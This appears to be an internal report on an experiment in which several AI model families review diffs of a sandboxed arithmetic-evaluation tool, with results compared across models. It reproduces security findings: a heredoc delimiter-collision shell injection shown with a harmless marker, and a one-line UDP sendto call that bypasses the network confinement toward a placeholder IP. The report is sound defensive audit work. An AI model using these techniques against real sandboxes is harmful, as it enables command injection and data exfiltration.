# Experiment: cross-model code review via OpenRouter, 2026-07-30

**Harness:** `scripts/cross-model-review.py` (diff pasted inline, no tools, no agent).
**Companion:** `experiment-results-code-review-2026-07-29.md` (single-family stability run).
**Raw data:** `runs/cross-model/{gt,fast}-<sha>/findings.jsonl` + `overlap.json`.

## Question

The 2026-07-29 experiment measured *within-family* stability (Claude critics resampled
against themselves). It could not answer whether the findings our pipeline produces are
*model-family-specific*.

This run asks the sharper version: **do other families find real issues that our own
review process missed in practice — issues that survived into merged code?**

Answer: **yes, three of them are live on `main` today.** Details in Results 1–3.

## Setup

- **Models (4 families):** `moonshotai/kimi-k3`, `openai/gpt-5.6-sol`,
  `anthropic/claude-sonnet-5` (the incumbent — the family that actually reviewed this
  code), `google/gemini-3.1-pro-preview`. 3 replicates each.
- **Judge:** `anthropic/claude-sonnet-4.5`, pinned (stage-2 same-issue matching).
- **Diffs — chosen for ground truth.** Three of four commits sit inside the
  arithmetic-eval review-fix chain, where the *next* commit's message enumerates exactly
  what escaped the previous round. That is an answer key produced by the real process, not
  reconstructed after the fact:

  | Diff | Commit | Answer key (what review missed at the time) |
  |---|---|---|
  | D1 | `8ef9d52` harden arithmetic-eval | `62beca1` — 7 findings (F1–F7) |
  | D2 | `503ebc9` rearchitect to self-contained blocks | `0c02887` — 6 findings |
  | D3 | `31e2d3a` revert sys-import RCE regression | `08563f1` — 8 findings |
  | D4 | `7ceba3f` self-improvement Tier C (tip of main) | none — any real finding is **live** |

- **Two sweeps.** `gt-*` is the full 4-model run. `fast-*` re-runs D2–D4 with the three
  fast families only, because Kimi's latency (below) risked the 50-min per-diff timeout
  killing the other models' data. D2 and D4 therefore have 6 Sonnet replicates, not 3.

**Deviation from production, stated up front:** this is the headless, no-tools arm. Models
see only the diff — they cannot read the repo. This matches the 2026-07-29 headless arm so
numbers are comparable, but it means these are *lower* bounds on recall, and it is the
direct cause of the false-positive cluster in Result 5.

---

## Result 1 — LIVE: heredoc delimiter collision defeats the skill's core safety guarantee

`skills/arithmetic-eval/SKILL.md`. Found on D1 by three of four families — GPT-5.6 Sol
(**Critical**, r1), Gemini 3.1 Pro (**Critical**, r3), Kimi K3 (Medium, r2) — and by **no**
Sonnet replicate.

The skill's security model opens with this guarantee:

> "Never interpolate untrusted text into shell or Python source. Feed it as *data* through
> a **quoted heredoc** (`<<'EOF'`), which disables all shell expansion of the body."

Quoting the delimiter disables *expansion*. It does not stop the body from containing a
line equal to the delimiter. Untrusted input containing a bare `EXPREOF` (Mode 1) or
`PYEOF` (Mode 2) line terminates the heredoc early; every following line is then read by
the shell as a command.

Reproduced (harmless marker in place of a payload) — the last three lines are the
untrusted blob:

```
( timeout 5 python3 -c 'import sys; print("evaluated:", repr(sys.stdin.read().strip()))' ) <<'EXPREOF'
1+1
EXPREOF
echo "MARKER-shell-command-executed-outside-heredoc"
```

→ prints `evaluated: '1+1'` **and then executes the `echo`**.

**Why it counts as escaped.** Both constructs are on `main` today. They survived seven
review rounds on this skill (`8ef9d52` → `08563f1`), all Claude-family. `docs/decisions/019`
restates the guarantee verbatim without qualification, and no artifact in `docs/reviews/`
mentions delimiter collision. The threat model is the skill's own: input "from a document
being fact-checked, a user claim, or code under review."

**Fix:** generate a random delimiter per invocation, or reject input containing a line
matching the delimiter before writing the heredoc.

## Result 2 — LIVE: `confine.py` does not block connectionless UDP egress

Found by Kimi K3 (Medium, D2 r3); by no other model and no review round.

`confine.py` is the runtime network boundary on the `unshare` and fallback tiers. It
patches `socket.socket.connect`, `.connect_ex`, `socket.create_connection`, and
`socket.getaddrinfo`. It does **not** patch `sendto`/`sendmsg`. UDP needs neither `connect`
nor DNS:

```
socket.socket(AF_INET, SOCK_DGRAM).sendto(payload, ("203.0.113.1", 53))
```

The in-code comment is honest — `getaddrinfo` "kills hostname resolution → **most** egress"
— but the raised error string is `"network disabled (fallback tier)"`, and the round-7 bats
assertion greps for that exact token, so both present it as categorical. The predecessor
`nonet.py` replaced the `socket.socket` class wholesale and had no such gap; the round-3
rewrite to method-patching introduced it.

**Scope, honestly:** reaching this requires already being past the static gate (`socket` is
not an approved import), and on the `unshare -rn` tier the netns has no route. It bites on
the **fallback tier**, which is opt-in behind `ARITH_ALLOW_UNCONFINED=1` since round 7. A
real hole in the layer documented as "the actual boundary", with a narrow reachable window.
Medium is the right severity — which is what Kimi assigned.

## Result 3 — LIVE (latent): unguarded grep pipeline can abort the loop under `pipefail`

`scripts/self-improvement.sh:1550`. Found by Kimi K3 only (Low, D4 r1).

```
NEXT_FP=$(grep -oE 'FP-[0-9]+' "$FP_LIB" | sed 's/FP-//' | sort -n | tail -1)
```

The script sets `set -euo pipefail` (line 44). This is the only fallible command in the
post-merge harvest block without a guard — every neighbouring call has `|| true` or
`|| echo ""`. If `failure-patterns.md` exists but contains no `FP-NNN` entry, `grep` exits
1, `pipefail` propagates, and the script dies **after merges have completed**, skipping the
remaining post-merge steps.

Verified the mechanism directly:

```
$ bash -c 'set -euo pipefail; N=$(grep -oE "FP-[0-9]+" empty.md | sed "s/FP-//" | sort -n | tail -1); echo "survived"'
$ echo $?
1          # "survived" never printed
```

The `[ -f "$FP_LIB" ]` guard anticipates the file being *absent* but not *empty* — and
header-only is the natural initial state of such a file. Currently latent (the file has 2
entries). Real defect, low severity, correctly rated Low by Kimi.

## Result 4 — the incumbent family abstained on a diff containing two real High bugs

D2 (`503ebc9`) is the sharpest comparison in the run. Its answer key (`0c02887`) contains
two unambiguous bugs:

- **F1** — bwrap mounted `--tmpfs /tmp` *after* `--ro-bind $AE`, and `$AE` lives under
  `/tmp`, so the tmpfs shadowed the bind and hid `script.py`. Mode 2 computed **nothing**
  on the default tier.
- **F2** — the `unshare -rn` tier dropped network but shared the host mount namespace and
  ran the script directly, so a gate-passing script could write host files.

| Model | F1 (tmpfs order) | F2 (unshare fs-write) | replicates scored |
|---|---|---|---|
| openai/gpt-5.6-sol | **5/6** | **6/6** | 6 |
| google/gemini-3.1-pro-preview | **4/4** | 3/4 | 4 |
| moonshotai/kimi-k3 | 1/1 | 0/1 | 1 (2 errored) |
| anthropic/claude-sonnet-5 | **0/6** | **0/6** | 6 |

Sonnet returned `FINDINGS: NONE` on **all six** replicates of a diff containing a bug that
silently broke the feature's primary execution path. Sol found F1 in 5 of 6 and stated the
correct fix ("mount `/tmp` first, then bind `$AE`") — exactly what `0c02887` did. Gemini
found F1 in every replicate it completed.

The claim here is not "other families are better." It is that **the family running our
review pipeline has correlated blind spots, and a second family removes them cheaply**:
Sol's three replicates cost ~$0.10 and returned in 60–85s each.

## Result 5 — the cost side: the highest-consensus finding on D4 was a false positive

On D4, **all four families** flagged, several at High, that decision record 020 documents
Tier A (`file_scope` widening) and Tier B (gate 1h, `parse_code_review_red` /
`code_review_gate_verdict` extracted to `si-functions.sh` with unit tests) while none of it
appears in the diff. Kimi escalated it to a functional bug: the new prompt tells agents to
write `docs/thoughts/retro-*.md`, but if gate 1c only permits `docs/working/`, every task
would be rejected by the loop's own validation.

**All of it is wrong.** Checked against the repo:

- `file_scope` allows `docs/working/`, `docs/decisions/`, `docs/reviews/` **and
  `docs/thoughts/`** (`self-improvement.sh:940`) — widened by Tier A in `5e67ab5`.
- `scripts/lib/si-functions.sh` exists and defines both functions, with unit tests in
  `test/code-review-gate.bats` — shipped by Tier B in `2b81baa`.

Decision 020 is accurate; it describes a three-tier change of which `7ceba3f` is the third
commit. The models saw one diff with no repo access and reasonably concluded the code was
missing. **Diff-only review manufactures confident, unanimous, high-severity findings about
anything that landed in a sibling commit.** Cross-family consensus did not help — it made
the false positive look stronger. This is an argument for keeping production critics
agentic, and for treating the no-tools arm as a recall probe only.

## Result 6 — cross-family overlap runs well below within-family overlap

Issue-level Jaccard, judge-matched (`anthropic/claude-sonnet-4.5`):

| Diff | J_self range | J_cross range |
|---|---|---|
| D1 `8ef9d52` | 0.000 – 0.539 | 0.034 – 0.388 |
| D2 `503ebc9` (fast) | 0.145 – 1.000\* | 0.000 – 0.000 |
| D4 `7ceba3f` (fast) | 0.344 – 0.778 | 0.065 – 0.148 |

Every pair involving Sonnet sits far below that model's own self-overlap — the tracker's
Thread-1 signal that **cross-model union buys recall rather than resampling noise**.

\* **A measurement pitfall worth fixing.** Sonnet's D2 `J_self = 1.000` is not stability —
it is three empty finding lists, and `jaccard()` scores empty-vs-empty as `1.0` ("both
clean: agreement"). **A model that abstains on everything scores perfect self-consistency.**
On D1 the same model scores `J_self = 0.000` for the mirror-image reason (one empty
replicate against two non-empty). Both numbers are abstention artifacts, not stability
measurements. J_self should be reported alongside an abstention rate, or computed only over
replicate pairs where at least one side is non-empty.

## Result 7 — earlier detection of issues the real process needed 1–3 more rounds to find

D1 answer-key recovery, in a single pass:

| Answer-key finding (`62beca1`) | Recovered by |
|---|---|
| F1 `__builtins__.eval` attribute-form bypass | Kimi r1/r2, Gemini r1 (Critical) |
| F2 `open()` with variable mode | Kimi ×3, Sol ×2, Sonnet r3, Gemini ×3 |
| F3 nested-power DoS | Kimi ×2, Sol ×3, Sonnet r3, Gemini r2 |
| F4 over-block of `json.load` / `df.rename` / `.replace` | all four families |
| F5 silent-failure guard | **missed by all** |
| F6 double-evaluation cleanup | **missed by all** |
| F7 `ulimit -v` 2GB vs BLAS arenas | Kimi r2 |

5 of 7 in one pass. Both misses are non-security maintainability items — consistent with a
prompt steering toward correctness/security.

Beyond the answer key: `operator.attrgetter`/`methodcaller` reflection-RCE was flagged High
by Kimi r3 and Sol r3 at D1; the real process did not find it until **round 4**
(`0c02887` F6). The `to_csv`/`savefig` write-sink gap (Sonnet r1, Gemini r1) likewise landed
at round 4 as F2.

## Cost and operational notes

- **Kimi K3 is the expensive, slow, high-yield arm.** 56–1581s per call (median ~350s),
  ~19k reasoning tokens, ≈$0.33/call. It produced the most findings per run and both of the
  live issues nobody else found (Results 2 and 3), and its severity calibration was the
  best in the set — it explicitly discounted findings because the static gate is documented
  as unsound. Sol/Sonnet/Gemini return in 27–253s.
- **Sol is the best cost/latency/recall compromise**: ~$0.03/call, ~60–90s, and it caught
  both D2 High bugs in every replicate.
- Harness cost estimator projected $0.41 for D1 and materially underestimates reasoning
  models (it assumes 1500 output tokens; Kimi used ~19k). It is a guard, not an accountant.
- Total spend for this experiment: well under $10 of the $100 balance.

## Follow-ups this run generates

1. **Fix Result 1** (random heredoc delimiter or delimiter-collision rejection) — the only
   one with a plausible exploit path against the documented threat model.
2. **Fix Result 2** (`sendto`/`sendmsg` in `confine.py`, or soften the "network disabled"
   claim and the bats assertion to match what is actually enforced).
3. **Fix Result 3** (`|| true` on the `NEXT_FP` pipeline, matching its neighbours).
4. **Fix the J_self abstention artifact** in `scripts/cross-model-review.py` — report an
   abstention rate, and stop scoring empty-vs-empty as 1.0.
5. **Consider a second-family critic in the review pipeline.** Result 4 is the evidence;
   Result 5 is the constraint (it must have repo access, not diff-only).

## Harness fixes made during this run

1. **Reasoning-model empty content** (committed). Kimi K3 returns `message.content = null`
   when the completion budget is consumed inside the reasoning trace. The old code indexed
   `["content"]` directly and would either crash or parse `""` as a clean "no findings" run,
   which then scored as perfect agreement with any other empty run. Now recorded as an
   errored run with its `finish_reason` and excluded from overlap. This fired twice for real
   on D2 (`finish_reason=stop` with empty content).
2. Operator note (not a code change): under zsh the model list must be word-split
   explicitly — an unquoted `$MODELS` is passed as a single model id and yields a silent
   per-replicate HTTP 400.
